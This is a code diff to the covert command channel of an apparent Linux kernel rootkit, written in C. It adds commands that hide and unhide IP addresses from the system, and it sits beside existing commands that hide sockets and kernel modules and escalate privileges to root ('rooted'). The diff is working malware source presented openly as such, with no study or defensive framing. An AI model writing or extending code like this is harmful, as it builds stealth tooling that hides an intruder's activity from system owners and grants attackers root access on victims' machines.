@@ -1,6 +1,8 @@
 /*
  * All functionality needed for the covert communication channel.
  */
+#include <linux/inet.h>
+ 
 #include "control.h"
 #include "include.h"
 #include "privilege_escalation.h"
@@ -15,13 +17,16 @@ static char command_buffer[32];
 static int command_counter = 0;
 
 static char param_buffer[1024];
-static int param_counter;
+static int param_counter = 0;
 
 void
 execute_command (void)
 {
 	int port;
 	pid_t pid;
+	__u32 ipaddr;
+	
+	u8 tmp[4];
 
 	if(strcmp(command_buffer, "enable_netlog") == 0) {
 		if(param_counter > 0) {
@@ -86,19 +91,61 @@ execute_command (void)
 			port = convert_atoi(param_buffer);
 			unhide_udp_socket(port);
 		}
-	} else if(strcmp(command_buffer, "hide_module") == 0) {
-                if(param_counter > 0) {
-                        hide_module_byname(param_buffer);
-                }
-
-        } else if(strcmp(command_buffer, "unhide_module") == 0) {
-                if(param_counter > 0) {
-                        unhide_module_byname(param_buffer);
-                }	
 		
+	} else if(strcmp(command_buffer, "hide_ip") == 0) {
+		if(param_counter > 0) {
+			/* convert ip string to an int array */
+			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0) {
+				ROOTKIT_DEBUG("[func 'hide_ip'] Not a valid IP address!\n");
+			}
+
+			/* hack to convert byte array to __u32 */
+			ipaddr = 0;
+			ipaddr |= tmp[0] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[1] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[2] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[3] & 0xFF;
+
+			hide_ip_address(ipaddr);
+		}
+		
+	} else if(strcmp(command_buffer, "unhide_ip") == 0) {
+		if(param_counter > 0) {
+			/* convert ip string to an int array */
+			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0) {
+				ROOTKIT_DEBUG("[func 'unhide_ip'] Not a valid IP address!\n");
+			}
+
+			/* hack to convert byte array to __u32 */
+			ipaddr = 0;
+			ipaddr |= tmp[0] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[1] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[2] & 0xFF;
+			ipaddr <<= 8;
+			ipaddr |= tmp[3] & 0xFF;
+
+			unhide_ip_address(ipaddr);
+		}
+		
+	} else if(strcmp(command_buffer, "hide_module") == 0) {
+		if(param_counter > 0) {
+			hide_module_byname(param_buffer);
+		}
+
+	} else if(strcmp(command_buffer, "unhide_module") == 0) {
+		if(param_counter > 0) {
+			unhide_module_byname(param_buffer);
+		}	
+
 	} else if(strcmp(command_buffer, "escalate") == 0) {
 		priv_escalation();
 		ROOTKIT_DEBUG("rooted\n");
+		
 	}
 	else if(strcmp(command_buffer, "deescalate") == 0) {
 		priv_deescalation();
